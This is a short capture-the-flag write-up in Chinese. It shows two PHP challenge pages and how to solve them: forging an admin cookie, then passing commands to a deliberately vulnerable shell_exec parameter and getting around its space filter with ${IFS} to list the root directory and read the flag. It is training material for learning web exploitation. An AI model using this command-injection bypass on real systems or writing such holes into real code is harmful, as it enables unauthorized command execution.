 <?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if($_COOKIE['admin']==1) 
{
    include "../next.php";
}
else
    echo "小饼干最好吃啦！";
?> 小饼干最好吃啦！

###########################
__第一個__
###########################

用hackbar偽做cookie "admin=1" =>  網頁會出一個 rasalghul.php
當輸入http：//xxxxxxxxx.xxx/rasalghul.php 

###########################
 <?php
error_reporting(0);
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/ /", $ip)){
      die('nonono');
  }
  $a = shell_exec($ip);
  echo $a;
}
?> 
##########################
第2個
##########################

preg_match("/ /", $ip)  => 过滤空格
http：//xxxxxxxxx.xxx/rasalghul.php?url=ls => url 的元素會直接執行linux命令 => 看根目录 => http：//xxxxxxxxx.xxx/rasalghul.php?url=ls${IFS}/
 => 看到flag => http：//xxxxxxxxx.xxx/rasalghul.php?url=cat${IFS}/flllllaaaaaaggggggg => flag 
 
##########################
知識點：
preg_match(） 过滤函數
$IFS 空格
hackbar偽做cookie
  
